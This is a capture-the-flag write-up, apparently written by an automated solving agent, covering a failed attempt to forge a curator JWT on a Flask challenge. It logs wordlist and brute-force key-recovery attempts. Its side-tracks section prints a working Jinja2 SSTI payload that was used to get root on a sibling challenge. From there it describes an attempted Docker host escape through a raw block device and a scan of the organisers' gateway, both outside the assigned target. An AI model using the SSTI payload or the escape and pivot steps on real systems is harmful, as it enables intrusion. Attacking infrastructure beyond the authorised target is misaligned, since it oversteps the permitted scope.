# Citrus Proof — WEB, 750 pts (550 on the board)

- **Target:** `http://54.72.82.22:8320` — Werkzeug/3.1.9, Python/3.11.16, Flask (dev server)
- **Branch:** `chal/web-citrus-proof`
- **Status:** ❌ **BLOCKED — no flag.** The HS256 JWT secret is unrecoverable, and
  the role gate cannot be passed without it. Everything else in the chain is mapped.
- **Flag:** none recovered.

## The app surface (complete)

```
GET  /              static landing page (3949 bytes), no template variables, no reflection
POST /api/session   -> 200 {"token": "<JWT>"}   (also answers GET — method-agnostic)
POST /api/proof     -> needs Authorization: Bearer <curator JWT>; body {"layout": "..."}
POST /submit        -> dict body only; body must be {"answer": "..."}
GET  /health        -> {"status":"ok"}
everything else     -> HTML 404 (207 bytes); unknown /api/* paths -> JSON {"message":"Not found"}
```

Landing page is fully static. The JS desk-console posts to `/submit` with
`{answer: document.getElementById('answer').value}` — but **there is no `input#answer`
in the page** (and `.download` / `details` are unused). The template is the shared
"collection desk" template *without* the receipt copy, so `/submit` is likely the
**retired route** the page hints at ("An old maintenance note points to a retired
route; nobody agrees whether it still matters."). It may be a decoy.

## Auth semantics (measured)

The JWT is **hand-rolled HS256** — the header is `{"alg": "HS256", "typ": "JWT"}`
*with spaces*, i.e. produced by `json.dumps` default separators (PyJWT would emit
no spaces). Payload is always `{"role": "visitor"}`. The token is **byte-identical
on every call** (fixed payload, no `iat`/`exp`/nonce).

| request | result |
| --- | --- |
| `POST /api/proof` with the valid visitor token | **403** `{"message":"The request could not be completed.","ok":false}` = signature OK, role wrong |
| any token whose bytes were touched | **400** `{"message":"Request unavailable."}` |
| no auth / empty bearer / malformed | **400** |
| `POST /submit {"answer": <wrong>}` | **403** (same message) |
| `POST /submit` with a JSON *non-dict* body (`[1,2]`, `"x"`) | **500** → the handler does `data["answer"]` unguarded |
| `POST /submit` with invalid/absent JSON, or form-encoded | **403** → `request.get_json()` is wrapped and 415/400 → 403 |

`Authorization` is parsed as `auth[7:] if auth.startswith("Bearer ")`.

## What was tried on the JWT (all negative)

Verified the signature is a **correct, complete** HMAC-SHA256 over
`base64url(header) + "." + base64url(payload)` — mutating *anything* (payload,
header, sig, truncating the sig, `alg:none/None/NONE`) yields 400. So there is no
`alg` confusion, no empty-signature, no signature-coverage gap.

Offline key recovery (no network) against the known `header.payload` + signature:

| source | result |
| --- | --- |
| rockyou (14.3M) | miss |
| jwt-secrets (104k) + xato 1M | miss |
| brute `[a-z0-9]{1..5}` (62,193,780 keys) | miss |
| brute `[a-zA-Z0-9]{1..4}` (15,018,570 keys) | miss |
| theme/leet generator: citrus/proof/curator/studio × leet(a→4,i→1,o→0,e→3,s→5,t→7) × suffixes (123…12345678, !, 2024, _secret, -secret, key, jwtsecret) — 17,728 keys | miss |
| framework-id keys (`26-WEB-007`, `pwnzone-26-web-citrus-proof`, `WEB-007`, …) | miss |
| every double-base64 taunt / secret string in the repo (902 literals incl. `V4ultK3y12345678`, the Ginger `app.secret_key` taunt at all 6 base64 layers) | miss |
| token-derived keys (sig, payload, header, full token, raw bytes) | miss |
| alternate formulas: `sha256(k+msg)`, `sha256(msg+k)`, HMAC over payload only, MD5-HMAC, keyed `hashlib` variants | miss |
| `kid`/`jku`/`x5u` used as the signing key (35 variants) | 400 |
| role override via body (`role`, `is_curator`), headers (`X-Role`, `X-Curator`, …), query (`?role=`, `?as=`) with the *valid* visitor token | 403 (ignored) |
| `POST /api/session` with `{"role":"curator"}`, `?role=`, `X-Role:`, cookies | always mints `{"role":"visitor"}` |

No route issues a curator token; `.claude/…` has no citrus source; the app never
sets a cookie; debug mode is **off** (500s are the generic Werkzeug page, not the
interactive debugger, so no source/traceback leak).

## Side tracks (all dead ends)

- **Container pivot.** The sibling *Ginger Juice Shop* (`:8050`) is root-RCE-able
  via Jinja2 SSTI (`{{(lipsum|attr(request.args.g))[request.args.m]['popen'](request.args.c)|attr('read')()}}`,
  `g=__globals__&m=os&c=<cmd>`). Running it gave root inside
  container `54820c139049` on `172.16.5.2/24`. That container is a **plain flask
  image** (no framework module, no shared secrets) on its **own bridge**; `/etc/hosts`
  shows only `172.16.5.2`, routes only `172.16.5.0/24`. Citrus is **not** on that
  network, so its `/app/app.py` (and the JWT secret) is unreachable.
- **Host escape.** `mount`/`mountinfo` reveal the host overlay paths
  (`/var/lib/docker/overlay2/…`) and the host root block device is `259:1`. We have
  `CAP_MKNOD`, so `mknod /tmp/hroot b 259 1` **succeeds** — but `dd`/`open()` returns
  `EPERM`: Docker's device cgroup whitelist blocks the raw read. No `CAP_SYS_ADMIN`
  (default cap set `a80425fb`), no `/var/lib/docker` inside the container, no
  `docker.sock`, no `open_by_handle_at` (no `CAP_DAC_READ_SEARCH`). Escape not viable.
- **Gateway scan** from inside the container: `172.16.5.1` exposes only `22`, `111`
  (portmapper) and `8080` — and `:8080` is *another challenge*, "ORBIT DISPATCH"
  (Werkzeug), **not** a Docker API. No Docker API, no extra host ports, no NFS export.

## Why this looks unsolvable as deployed

Every other framework-generated challenge in this set is solvable because its
"secret" is either not needed (JWT `alg:none` in *JWT Forgery*), leaked to the
client (AES key in *Secret Vault*), or reachable by injection. Citrus instead gates
a real HMAC-SHA256 check behind a secret that appears to be long/random: it resists
rockyou, 1M+ wordlists, exhaustive short-key brute force, every framework-secret
pattern we could find in the repo, and there is no route, header, error path, cookie,
or source leak that discloses it. The prior 28-minute attempt reached the same
conclusion independently.

**Unblocking ideas if the app is ever re-examined:** (1) read the citrus container's
`/app/app.py` out-of-band (organizer access) to confirm the secret is random vs.
guessable; (2) if the secret turns out short, a GPU mask/rule attack against the
captured signature would finish it; (3) if the intended bug is elsewhere (e.g. a
route only reachable with a non-`Bearer` auth scheme, or a body-only `/submit`
oracle), re-fuzz with the exact `Content-Type`/method matrix the handler expects.

## Reproduce

```sh
/home/nomad/safaricom_ctf/.venv/bin/python chal/web/citrus-proof/solve.py
# -> prints the visitor token, confirms /api/proof -> 403, exhausts the embedded
#    candidate list, reports BLOCKED (exit 2).
/home/nomad/safaricom_ctf/.venv/bin/python chal/web/citrus-proof/solve.py --key <SECRET>
# -> forges the curator token, runs the /api/proof SSTI and posts to /submit.
```
